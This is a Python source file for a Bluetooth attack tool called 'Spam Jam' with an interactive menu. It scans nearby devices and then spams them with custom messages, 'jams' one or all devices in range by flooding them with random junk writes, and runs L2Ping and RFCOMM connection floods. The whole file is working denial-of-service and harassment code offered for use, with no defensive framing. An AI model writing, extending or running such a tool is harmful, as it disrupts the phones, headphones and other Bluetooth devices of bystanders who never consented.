import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, BTLEException

# 🎨 Spam Jam Banner
def print_banner():
    print(r"""
███████╗██████╗  █████╗ ███╗   ███╗         ██╗ █████╗ ███╗   ███╗
██╔════╝██╔══██╗██╔══██╗████╗ ████║         ██║██╔══██╗████╗ ████║
███████╗██████╔╝███████║██╔████╔██║         ██║███████║██╔████╔██║
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
   ❤️💜 A WORLD OF BLE FUN 💜❤️
   👩‍💻 Author: ekoms savior
   🎯 Now with BLE Advertise ALL !! 🎉
   """)
    print("💜 XOXO HACK THE PLANET! 💜\n")

# 🎯 BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)
    def handleNotification(self, cHandle, data):
        print(f"🔔 Notification from BLE device: {data}")

# 💌 Flipper-Style BLE Advertise All
def flipper_ble_advertise_all():
    print("💜 Launching BLE Advertise All — Flipper Style 💣📡")
    names = [
        "SpamJam_XOXO", "💜HAXX💜", "BLE_Boop", "👾GOTCHA", 
        "Free_Wifi_LOL", "Not_A_Trap", "💣 BT_Bomb", "UFO-SIGNAL", 
        "🍭CandyBLE", "💀NSA_Van", "HackThePlanet", "💜ekoms💜"
    ]
    try:
        subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "discoverable", "on"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "pairable", "on"], stdout=subprocess.DEVNULL)
        subprocess.run(["bluetoothctl", "agent", "NoInputNoOutput"], stdout=subprocess.DEVNULL)

        while True:
            for name in names:
                subprocess.run(["bluetoothctl", "system-alias", name], stdout=subprocess.DEVNULL)
                print(f"📡 Broadcasting: {name}")
                time.sleep(1.2)

    except KeyboardInterrupt:
        print("\n🛑 BLE Advertise All stopped. Restoring name...")
        subprocess.run(["bluetoothctl", "system-alias", "SpamJam"], stdout=subprocess.DEVNULL)

# 🔎 Interactive BLE Scanner
def interactive_ble_scan():
    print("🔎 Scanning for BLE devices nearby...")
    scanner = Scanner()
    try:
        devices = list(scanner.scan(10.0))
        if not devices:
            print("⚠️ No BLE devices found.")
            return []
        for idx, dev in enumerate(devices):
            print(f"🔹 {idx}: {dev.addr} ({dev.addrType}), RSSI={dev.rssi} dB")
        return devices
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")
        return []

# 🚀 Spam Single BLE Device
def spam_ble():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of device to spam: "))
        target_mac = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid index.")
        return

    print(f"🚀 Spamming device {target_mac} 💥💜")
    custom_message = input("💜 Enter your custom spam message: ").encode()

    try:
        print("🔎 Attempting connection with RANDOM address type...")
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
    except BTLEException:
        print("⚠️ RANDOM address type failed! Trying PUBLIC address type...")
        try:
            peripheral = Peripheral(target_mac, ADDR_TYPE_PUBLIC)
        except BTLEException as e:
            print(f"❌ Failed to connect to {target_mac}. Error: {e}")
            return

    peripheral.setDelegate(BLESpam())
    while True:
        try:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            break

# 🚀 Spam All BLE Devices
def spam_all_ble():
    devices = interactive_ble_scan()
    if not devices:
        return
    custom_message = input("💜 Enter your spam message for all devices: ").encode()
    for device in devices:
        try:
            print(f"🚀 Trying to spam {device.addr} 💌")
            peripheral = Peripheral(device.addr, ADDR_TYPE_RANDOM)
            peripheral.setDelegate(BLESpam())
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"💜 Spammed {device.addr}")
            peripheral.disconnect()
        except Exception as e:
            print(f"⚠️ Could not spam {device.addr}: {e}")

# 🚫 Jam Single BLE Device
def jam_ble():
    print("🔎 Resetting BLE scan before jamming...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    scanner = Scanner()
    try:
        devices = list(scanner.scan(15.0))
    except BTLEException as e:
        print(f"⚠️ BLE Scan Failed: {e}")
        return
    if not devices:
        print("⚠️ No devices found!")
        return
    for idx, device in enumerate(devices):
        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
    try:
        idx = int(input("💜 Enter index of device to jam: "))
        target = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid choice.")
        return
    print(f"💥 Jamming {target} 🚫")
    try:
        peripheral = Peripheral(target)
        while True:
            junk = os.urandom(random.randint(20, 50))
            peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
            print(f"🚫 Jammed {target}")
            time.sleep(random.uniform(0.05, 0.2))
    except Exception as e:
        print(f"⚠️ Error: {e}")
        if input("💜 Try another? (y/n): ").strip().lower() == 'y':
            jam_ble()

# 🚫 Jam All BLE Devices
def jam_all_ble():
    print("🔎 Starting auto-rejam loop 📡")
    try:
        min_rssi = int(input("💜 Enter minimum RSSI to jam (e.g. -80): "))
    except ValueError:
        min_rssi = -80
        print("⚠️ Invalid input. Using default -80 dB.")
    try:
        while True:
            print("\n🔁 Scanning for BLE devices to jam...")
            scanner = Scanner()
            try:
                devices = list(scanner.scan(15.0))
            except BTLEException as e:
                print(f"⚠️ BLE Scan failed: {e}")
                continue
            for dev in devices:
                print(f"  • {dev.addr} RSSI={dev.rssi} dB")
            jam_targets = [dev for dev in devices if dev.rssi >= min_rssi]
            if not jam_targets:
                print("⚠️ No targets above threshold.")
            for device in jam_targets:
                try:
                    print(f"💥 Jamming {device.addr} (RSSI={device.rssi} dB)")
                    peripheral = Peripheral(device.addr)
                    junk = os.urandom(random.randint(20, 50))
                    peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
                    peripheral.disconnect()
                    time.sleep(random.uniform(0.05, 0.2))
                except Exception as e:
                    print(f"⚠️ Skipped {device.addr}: {e}")
            print("🔁 Waiting 5 seconds...")
            time.sleep(5)
            print("🔍 Also scanning for classic devices...")
            subprocess.run(["hcitool", "scan"])
    except KeyboardInterrupt:
        print("\n🛑 Stopped by user.")

# Bluetooth Scanner
def scan_bluetooth():
    print("🔎 Scanning for Bluetooth devices...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        scanner = Scanner()
        devices = list(scanner.scan(10.0))
        if not devices:
            print("⚠️ No Bluetooth devices found.")
            return
        for idx, d in enumerate(devices):
            print(f"🔹 {idx}: {d.addr} ({d.addrType}), RSSI={d.rssi} dB")
    except BTLEException as e:
        print(f"⚠️ Scan failed: {e}")

# 💥 L2Ping
def l2ping_attack():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of device to L2Ping: "))
        addr = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid selection.")
        return
    if os.geteuid() != 0:
        print("⚠️ L2Ping needs sudo!")
        return
    print(f"💥 Sending L2Ping to {addr}")
    try:
        subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
        print("✅ L2Ping success!")
    except subprocess.CalledProcessError:
        print(f"⚠️ Failed. Device may be offline.")

# ✅ RFCOMM Flood
def rfcomm_flood():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("💜 Enter index of device for RFCOMM Flood: "))
        addr = devices[idx].addr
    except (ValueError, IndexError):
        print("⚠️ Invalid selection.")
        return
    print(f"💥 Starting RFCOMM flood on {addr}...")
    for i in range(1000):
        try:
            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
            print(f"✅ Attempt {i+1}: Connected")
        except subprocess.CalledProcessError:
            print(f"⚠️ Attempt {i+1}: Failed")

# 🧠 Start Bluetooth
def start_bluetooth():
    print("📡 Starting Bluetooth service...")
    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
    print("✅ Bluetooth service started!")

# 🏁 Main Menu
def main():
    print_banner()
    while True:
        print("\n🔹 0 BLE Advertise All 💣")
        print("🔹 1 Start Bluetooth Service 📡")
        print("🔹 2 Scan for Bluetooth devices 📡")
        print("🔹 3 Spam a BLE device 💌")
        print("🔹 4 Spam All BLE Devices 💌💥")
        print("🔹 5 Jam a BLE device 🚫")
        print("🔹 6 Jam All BLE Devices 🚫💥")
        print("🔹 7 L2Ping Attack 💥")
        print("🔹 8 RFCOMM Flood 💥")
        print("🔹 9 Quit 🚪")

        choice = input("💜 Choose an option (0-9): ").strip()
        functions = [flipper_ble_advertise_all, start_bluetooth, scan_bluetooth, spam_ble,
                     spam_all_ble, jam_ble, jam_all_ble, l2ping_attack, rfcomm_flood]

        if choice == "9":
            print("👋 Goodbye, fren! XOXOXO 💜")
            sys.exit()
        elif choice in map(str, range(0, 9)):
            functions[int(choice)]()
        else:
            print("⚠️ Invalid choice. Try again! 💜")

if __name__ == "__main__":
    main()
